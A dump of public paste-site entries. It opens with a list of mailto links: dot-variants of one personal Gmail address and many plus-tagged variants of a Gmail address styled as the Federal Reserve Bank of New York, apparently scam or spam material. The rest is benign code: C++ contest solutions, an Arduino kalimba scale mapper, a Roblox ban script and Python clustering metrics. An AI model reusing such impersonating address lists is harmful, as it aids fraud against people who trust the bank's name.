+<a href=""mailto:mr.sj.a.smin.e.wals.h12.22@gmail.com"">mr.sj.a.smin.e.wals.h12.22@gmail.com</a>
+<a href=""mailto:m.r.s.ja.s.mi.ne.wals.h122.2@gmail.com"">m.r.s.ja.s.mi.ne.wals.h122.2@gmail.com</a>
+<a href=""mailto:m.r.s.j.a.smi.ne.wa.lsh.12.2.2@gmail.com"">m.r.s.j.a.smi.ne.wa.lsh.12.2.2@gmail.com</a>
+<a href=""mailto:m.r.s.ja.sm.in.e.w.a.lsh.12.22@gmail.com"">m.r.s.ja.sm.in.e.w.a.lsh.12.22@gmail.com</a>
+<a href=""mailto:mr.sj.asmi.ne.w.a.l.s.h.1.2.22@gmail.com"">mr.sj.asmi.ne.w.a.l.s.h.1.2.22@gmail.com</a>
+<a href=""mailto:mrsjas.mi.new.al.sh1.2.2.2@gmail.com"">mrsjas.mi.new.al.sh1.2.2.2@gmail.com</a>
+<a href=""mailto:mrsjas.m.inewa.l.sh.1.222@gmail.com"">mrsjas.m.inewa.l.sh.1.222@gmail.com</a>
+<a href=""mailto:m.rsj.a.s.min.e.wals.h.1222@gmail.com"">m.rsj.a.s.min.e.wals.h.1222@gmail.com</a>
+<a href=""mailto:m.r.s.j.a.sm.i.new.al.sh.12.22@gmail.com"">m.r.s.j.a.sm.i.new.al.sh.12.22@gmail.com</a>
+<a href=""mailto:mr.s.j.asmi.new.al.sh.1.22.2@gmail.com"">mr.s.j.asmi.new.al.sh.1.22.2@gmail.com</a>
+<a href=""mailto:mrsj.asm.i.n.ewals.h.1.22.2@gmail.com"">mrsj.asm.i.n.ewals.h.1.22.2@gmail.com</a>
+<a href=""mailto:mrs.jas.m.i.n.ew.al.s.h1.22.2@gmail.com"">mrs.jas.m.i.n.ew.al.s.h1.22.2@gmail.com</a>
+<a href=""mailto:mrsja.s.mi.n.e.w.a.ls.h.1.222@gmail.com"">mrsja.s.mi.n.e.w.a.ls.h.1.222@gmail.com</a>
+<a href=""mailto:m.rsj.as.mi.ne.wa.ls.h.1.222@gmail.com"">m.rsj.as.mi.ne.wa.ls.h.1.222@gmail.com</a>
+<a href=""mailto:m.r.sja.sm.ine.w.a.l.s.h1.2.2.2@gmail.com"">m.r.sja.sm.ine.w.a.l.s.h1.2.2.2@gmail.com</a>
+<a href=""mailto:mr.s.ja.s.m.in.e.wa.l.s.h12.22@gmail.com"">mr.s.ja.s.m.in.e.wa.l.s.h12.22@gmail.com</a>
+<a href=""mailto:m.rs.j.as.m.in.e.w.al.s.h1222@gmail.com"">m.rs.j.as.m.in.e.w.al.s.h1222@gmail.com</a>
+<a href=""mailto:mr.s.j.a.s.m.i.newa.l.sh12.22@gmail.com"">mr.s.j.a.s.m.i.newa.l.sh12.22@gmail.com</a>
+<a href=""mailto:m.r.s.j.a.smi.newa.lsh.1.2.2.2@gmail.com"">m.r.s.j.a.smi.newa.lsh.1.2.2.2@gmail.com</a>
+<a href=""mailto:mrsjas.m.inewa.ls.h12.2.2@gmail.com"">mrsjas.m.inewa.ls.h12.2.2@gmail.com</a>
+<a href=""mailto:mrsj.asmine.wa.l.sh.122.2@gmail.com"">mrsj.asmine.wa.l.sh.122.2@gmail.com</a>
+<a href=""mailto:mr.s.j.asmine.wal.s.h1222@gmail.com"">mr.s.j.asmine.wal.s.h1222@gmail.com</a>
+<a href=""mailto:mrs.j.a.s.min.e.w.a.ls.h.1.2.22@gmail.com"">mrs.j.a.s.min.e.w.a.ls.h.1.2.22@gmail.com</a>
+<a href=""mailto:mr.s.j.a.s.min.e.w.al.s.h.1222@gmail.com"">mr.s.j.a.s.min.e.w.al.s.h.1222@gmail.com</a>
+<a href=""mailto:m.rsj.a.s.mi.newa.l.s.h1222@gmail.com"">m.rsj.a.s.mi.newa.l.s.h1222@gmail.com</a>
+<a href=""mailto:mrsja.s.mi.n.e.w.al.s.h1.222@gmail.com"">mrsja.s.mi.n.e.w.al.s.h1.222@gmail.com</a>
+<a href=""mailto:mrs.j.a.s.mine.wa.lsh.12.22@gmail.com"">mrs.j.a.s.mine.wa.lsh.12.22@gmail.com</a>
+<a href=""mailto:mrs.ja.s.m.inewalsh1.2.2.2@gmail.com"">mrs.ja.s.m.inewalsh1.2.2.2@gmail.com</a>
+<a href=""mailto:m.rs.ja.sm.in.e.wa.l.sh12.2.2@gmail.com"">m.rs.ja.sm.in.e.wa.l.sh12.2.2@gmail.com</a>
+<a href=""mailto:m.r.sj.as.mi.newalsh1.22.2@gmail.com"">m.r.sj.as.mi.newalsh1.22.2@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork@gmail.com"">info1federalreservebanknewyork@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+20164@gmail.com"">info1federalreservebanknewyork+20164@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+19451@gmail.com"">info1federalreservebanknewyork+19451@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+24506@gmail.com"">info1federalreservebanknewyork+24506@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+26121@gmail.com"">info1federalreservebanknewyork+26121@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+25052@gmail.com"">info1federalreservebanknewyork+25052@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+15952@gmail.com"">info1federalreservebanknewyork+15952@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+27393@gmail.com"">info1federalreservebanknewyork+27393@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+12513@gmail.com"">info1federalreservebanknewyork+12513@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+15895@gmail.com"">info1federalreservebanknewyork+15895@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+10004@gmail.com"">info1federalreservebanknewyork+10004@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+32388@gmail.com"">info1federalreservebanknewyork+32388@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+15739@gmail.com"">info1federalreservebanknewyork+15739@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+8915@gmail.com"">info1federalreservebanknewyork+8915@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+25406@gmail.com"">info1federalreservebanknewyork+25406@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+9438@gmail.com"">info1federalreservebanknewyork+9438@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+4006@gmail.com"">info1federalreservebanknewyork+4006@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+29302@gmail.com"">info1federalreservebanknewyork+29302@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+15164@gmail.com"">info1federalreservebanknewyork+15164@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+2851@gmail.com"">info1federalreservebanknewyork+2851@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+16397@gmail.com"">info1federalreservebanknewyork+16397@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+16208@gmail.com"">info1federalreservebanknewyork+16208@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+1499@gmail.com"">info1federalreservebanknewyork+1499@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+24796@gmail.com"">info1federalreservebanknewyork+24796@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+12436@gmail.com"">info1federalreservebanknewyork+12436@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+28157@gmail.com"">info1federalreservebanknewyork+28157@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+18525@gmail.com"">info1federalreservebanknewyork+18525@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+22071@gmail.com"">info1federalreservebanknewyork+22071@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+3915@gmail.com"">info1federalreservebanknewyork+3915@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+27033@gmail.com"">info1federalreservebanknewyork+27033@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+12147@gmail.com"">info1federalreservebanknewyork+12147@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+4771@gmail.com"">info1federalreservebanknewyork+4771@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+15948@gmail.com"">info1federalreservebanknewyork+15948@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+26375@gmail.com"">info1federalreservebanknewyork+26375@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+14247@gmail.com"">info1federalreservebanknewyork+14247@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+31354@gmail.com"">info1federalreservebanknewyork+31354@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+31361@gmail.com"">info1federalreservebanknewyork+31361@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+25870@gmail.com"">info1federalreservebanknewyork+25870@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+12017@gmail.com"">info1federalreservebanknewyork+12017@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+25310@gmail.com"">info1federalreservebanknewyork+25310@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+2761@gmail.com"">info1federalreservebanknewyork+2761@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+23739@gmail.com"">info1federalreservebanknewyork+23739@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+9595@gmail.com"">info1federalreservebanknewyork+9595@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+27433@gmail.com"">info1federalreservebanknewyork+27433@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+5620@gmail.com"">info1federalreservebanknewyork+5620@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+17448@gmail.com"">info1federalreservebanknewyork+17448@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+2328@gmail.com"">info1federalreservebanknewyork+2328@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+23520@gmail.com"">info1federalreservebanknewyork+23520@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+19242@gmail.com"">info1federalreservebanknewyork+19242@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+4704@gmail.com"">info1federalreservebanknewyork+4704@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+1564@gmail.com"">info1federalreservebanknewyork+1564@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+5547@gmail.com"">info1federalreservebanknewyork+5547@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+2205@gmail.com"">info1federalreservebanknewyork+2205@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+7630@gmail.com"">info1federalreservebanknewyork+7630@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+25140@gmail.com"">info1federalreservebanknewyork+25140@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+555@gmail.com"">info1federalreservebanknewyork+555@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+17093@gmail.com"">info1federalreservebanknewyork+17093@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+7660@gmail.com"">info1federalreservebanknewyork+7660@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+7961@gmail.com"">info1federalreservebanknewyork+7961@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+20080@gmail.com"">info1federalreservebanknewyork+20080@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+15532@gmail.com"">info1federalreservebanknewyork+15532@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+14700@gmail.com"">info1federalreservebanknewyork+14700@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+2690@gmail.com"">info1federalreservebanknewyork+2690@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+7870@gmail.com"">info1federalreservebanknewyork+7870@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+30620@gmail.com"">info1federalreservebanknewyork+30620@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+8897@gmail.com"">info1federalreservebanknewyork+8897@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+6342@gmail.com"">info1federalreservebanknewyork+6342@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+7136@gmail.com"">info1federalreservebanknewyork+7136@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+24200@gmail.com"">info1federalreservebanknewyork+24200@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+19738@gmail.com"">info1federalreservebanknewyork+19738@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+6092@gmail.com"">info1federalreservebanknewyork+6092@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+1753@gmail.com"">info1federalreservebanknewyork+1753@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+32524@gmail.com"">info1federalreservebanknewyork+32524@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+2943@gmail.com"">info1federalreservebanknewyork+2943@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+7370@gmail.com"">info1federalreservebanknewyork+7370@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+24171@gmail.com"">info1federalreservebanknewyork+24171@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+24960@gmail.com"">info1federalreservebanknewyork+24960@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+26196@gmail.com"">info1federalreservebanknewyork+26196@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+18131@gmail.com"">info1federalreservebanknewyork+18131@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+1540@gmail.com"">info1federalreservebanknewyork+1540@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+29117@gmail.com"">info1federalreservebanknewyork+29117@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+24050@gmail.com"">info1federalreservebanknewyork+24050@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+18423@gmail.com"">info1federalreservebanknewyork+18423@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+12731@gmail.com"">info1federalreservebanknewyork+12731@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+20910@gmail.com"">info1federalreservebanknewyork+20910@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+31077@gmail.com"">info1federalreservebanknewyork+31077@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+28041@gmail.com"">info1federalreservebanknewyork+28041@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+16763@gmail.com"">info1federalreservebanknewyork+16763@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+25118@gmail.com"">info1federalreservebanknewyork+25118@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+17711@gmail.com"">info1federalreservebanknewyork+17711@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+30766@gmail.com"">info1federalreservebanknewyork+30766@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+13975@gmail.com"">info1federalreservebanknewyork+13975@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+19994@gmail.com"">info1federalreservebanknewyork+19994@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+5077@gmail.com"">info1federalreservebanknewyork+5077@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+17645@gmail.com"">info1federalreservebanknewyork+17645@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+23612@gmail.com"">info1federalreservebanknewyork+23612@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+2651@gmail.com"">info1federalreservebanknewyork+2651@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+14081@gmail.com"">info1federalreservebanknewyork+14081@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+24402@gmail.com"">info1federalreservebanknewyork+24402@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+8203@gmail.com"">info1federalreservebanknewyork+8203@gmail.com</a>
+<a href=""mailto:info1federalreservebanknewyork+8112@gmail.com"">info1federalreservebanknewyork+8112@gmail.com</a>"
+rxzdq72t,Untitled,rembocoder,C++,Sunday 14th of May 2023 12:31:12 PM CDT,"#include <bits/stdc++.h>
+ 
+#define int int64_t
+ 
+using namespace std;
+ 
+void relax(int& a, int b) {
+    a = max(a, b);
+}
+ 
+int32_t main() {
+    ios_base::sync_with_stdio(false);
+    int n, k;
+    cin >> n >> k;
+    vector<int> a(n);
+    for (int i = 1; i < n - 1; i++) {
+        cin >> a[i];
+    }
+    vector<int> dp(n, -2e18);
+    dp[0] = 0;
+    for (int i = 1; i < n; i++) {
+        for (int j = 1; j <= k && j <= i; j++) {
+            relax(dp[i], dp[i - j] + a[i]);
+        }
+    }
+    cout << dp[n - 1] << '\n';
+}
+"
+QUCvujtX,Kalimba scale example,retrokits,Arduino,Sunday 14th of May 2023 12:28:32 PM CDT,"/*
+  Sawyer Monk Kalimba Style Example 
+  I defined two scales to compare, one the regular scale, and one for the kalimba
+  with CC1 (modwheel) you can switch through the scales, off = chromatic, full = kalimba
+  
+  scale array explanation:
+  
+  0 - 11 are as follows:
+  0  1  2  3  4  5  6  7  8  9  10  11
+  C  C# D  D# E  F  F# G  G# A  A#  B
+  
+  to remap whites:
+  C     E     G  B     D     F     A
+  written in numbers:
+  0     2     7  11    2     5     9
+  blacks:
+     D     F        C     E     G
+  =  2     5        1     4     7
+  total array entry:
+  0, 2, 2,  5, 7,11, 1, 2, 4,5, 7, 9
+  
+  now let's duy it!:
+*/
+const byte scales[2][12] = {
+{0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11}, // 0 'Chromatic'
+{0, 0 ,2, 3, 3, 5, 5, 7, 8, 8, 10, 10}, // 1 ‘Kalimba’  
+};
+
+byte scale=0;
+
+// calculate key octave:
+byte octavebyKey(byte key)
+{
+  if (key == 0)
+    return 0;
+
+  return (key / 12);
+}
+
+// calculate scaled key:
+byte scaledKey(byte key)
+{
+  return scales[scale][(key % 12)] + (octavebyKey(key) * 12);
+}
+
+// check if modwheel is changed:
+bool RK002_onControlChange(byte chn, byte nr, byte val)
+{
+  if (nr == 1) {
+    scale=val/126; // low values will give scale value 0, high values will give value 1
+    // Send ""all notes off"" to disable notes being sustained during controller change
+    RK002_sendControlChange(chn, 123, 0); 
+  }
+  return true;
+}
+
+// process note on messages:
+bool RK002_onNoteOn(byte chn, byte key, byte vel)
+{
+  RK002_sendNoteOn(chn, scaledKey(key), vel);
+  return false;
+}
+
+// process note of messages:
+bool RK002_onNoteOff(byte chn, byte key, byte vel)
+{
+  RK002_sendNoteOff(chn, scaledKey(key), vel);
+  return false;
+}
+// .. no other processed needed, next is the compulsory routines
+// but these can be empty
+
+void setup()
+{
+}
+
+void loop()
+{
+}
+"
+JkHzMwCc,Untitled,rembocoder,C++,Sunday 14th of May 2023 12:25:34 PM CDT,"#include <bits/stdc++.h>
+ 
+#define int int64_t
+ 
+using namespace std;
+ 
+int mod = 1e9 + 7;
+ 
+int32_t main() {
+    ios_base::sync_with_stdio(false);
+    int n, k;
+    cin >> n >> k;
+    string s;
+    cin >> s;
+    vector<int> dp(n);
+    dp[0] = 1;
+    for (int i = 1; i < n; i++) {
+        if (s[i - 1] == 'X') {
+            continue;
+        }
+        for (int j = 1; j <= k && j <= i; j++) {
+            (dp[i] += dp[i - j]) %= mod;
+        }
+    }
+    cout << dp[n - 1] << '\n';
+}
+"
+k1gjCeFk,B. Permutation Swap,Plabon_dutta,C++,Sunday 14th of May 2023 12:21:22 PM CDT,"#include <bits/stdc++.h>
+
+using namespace std;
+
+int main() {
+    ios_base::sync_with_stdio(false), cin.tie(NULL), cout.tie(NULL);
+
+    int testcase;
+    cin >> testcase;
+    while(testcase--) {
+        int n;
+        cin >> n;
+
+        set <int> s;
+        for (int i = 1; i <= n; i++) {
+            int x;
+            cin >> x;
+            if (abs(x - i) != 0) s.insert(abs(x - i));
+        } 
+        int ans = 0;
+
+        for (auto i : s) {
+            ans = __gcd(ans, i);
+        } 
+
+        cout << ans << '\n';
+    }   
+
+    return 0;
+}"
+3hR6Jace,Untitled,rembocoder,C++,Sunday 14th of May 2023 12:16:23 PM CDT,"#include <bits/stdc++.h>
+
+#define int int64_t
+
+using namespace std;
+
+void relax(int& a, int b) {
+    a = max(a, b);
+}
+
+int32_t main() {
+    ios_base::sync_with_stdio(false);
+    int n, m;
+    cin >> n >> m;
+    vector<vector<int>> a(n, vector<int>(m));
+    for (int i = 0; i < n; i++) {
+        for (int j = 0; j < m; j++) {
+            cin >> a[i][j];
+        }
+    }
+    vector<vector<int>> dp(n, vector<int>(m, -2e18));
+    dp[0][0] = a[0][0];
+    for (int i = 0; i < n; i++) {
+        for (int j = 0; j < m; j++) {
+            if (i == 0 && j == 0) {
+                continue;
+            }
+            if (i) {
+                relax(dp[i][j], dp[i - 1][j] + a[i][j]);
+            }
+            if (j) {
+                relax(dp[i][j], dp[i][j - 1] + a[i][j]);
+            }
+        }
+    }
+    cout << dp[n - 1][m - 1] << '\n';
+}
+"
+ipkS67dY,Ban System Script,Reactive_Metal,Lua,Sunday 14th of May 2023 12:08:49 PM CDT,"-- Author: Reccur AKA Reactive Metal
+
+local dataStoreService = game:GetService(""DataStoreService"")
+local dataStore = dataStoreService:GetDataStore(""Stuff"")
+
+dataStore:RemoveAsync(""1693468811"" .. ""-Banned"")
+
+local groupId = 11571768 -- put your group id here if you have one
+local minRank = 254 -- minimum rank in your group to use the ban command
+
+local whitelisted = {""reccur"", ""player2""} --[[ additionally, you, can whitelist players that can use 
+											the ban command by adding their names in this table, 
+											(preferrable if you ont have a group)
+											]]
+
+game.Players.PlayerAdded:Connect(function(plr)
+	
+	local IsBanned = dataStore:GetAsync(plr.UserId.. ""-Banned"") or false
+	
+	if IsBanned then
+		plr:Kick(""You have been banned"")
+	end
+	
+	
+	local command = ""/ban ([%w_]+)""
+	
+	plr.Chatted:Connect(function(msg)
+		
+		if plr:GetRankInGroup(groupId) >= minRank or table.find(whitelisted, plr.Name) then
+			
+			local bannedPlrName = msg:match(command)
+
+			for i, p in pairs(game.Players:GetChildren()) do
+
+				if string.lower(p.Name) == string.lower(bannedPlrName) or string.lower(p.DisplayName) == string.lower(bannedPlrName)  then
+
+					local suc, err = pcall(function()
+
+						dataStore:SetAsync(p.UserId..""-Banned"", true)
+						p:Kick(""You have been banned!"")
+
+					end)
+
+					if err then
+						warn(err)
+					end
+
+					break
+
+
+				end
+
+			end
+			
+		end
+		
+
+		
+	end)
+
+end)"
+1u0tqf2z,Untitled,Dimaush,Python,Sunday 14th of May 2023 12:08:06 PM CDT,"import numpy as np
+
+import sklearn
+import sklearn.metrics
+
+
+def silhouette_score(x, labels):
+    if np.unique(labels).shape[0] == 1:
+        return 0
+
+    s = np.zeros(x.shape[0])
+    clusters = []
+
+    for label in np.unique(labels):
+        if (labels == label).shape[0] == 1:
+            s[(labels == label)] = 0
+        else:
+            values = np.sum(sklearn.metrics.pairwise_distances(x, x)[:, (labels == label)], axis=1)
+            s[(labels == label) * (np.sum(labels == label) > 1)] = values[(labels == label) * (np.sum(labels == label) > 1)] / (np.sum(labels == label) - 1)
+            avg = values / np.sum(labels == label)
+            avg[(labels == label)] = np.max(sklearn.metrics.pairwise_distances(x, x)) + 1
+            clusters.append(avg)
+
+    p = np.min(np.stack(clusters), axis=0)
+    m = (p != 0) * (s != 0)
+
+    sil = np.zeros(x.shape[0])
+    sil[m] = (p - s)[m] / np.maximum(p, s)[m]
+    sil_score = np.mean(sil, axis=0)
+    return sil_score
+
+
+def bcubed_score(true_labels, predicted_labels):
+    n_objects = true_labels.shape[0]
+    precision = 0
+    recall = 0
+    for i in range(n_objects):
+        p = true_labels[(predicted_labels == predicted_labels[i])]
+        precision += np.mean(p == true_labels[i])
+        r = predicted_labels[(true_labels == true_labels[i])]
+        recall += np.mean(r == predicted_labels[i])
+    precision /= n_objects
+    recall /= n_objects
+    score = 2 * (precision * recall) / (precision + recall)
+    return score"
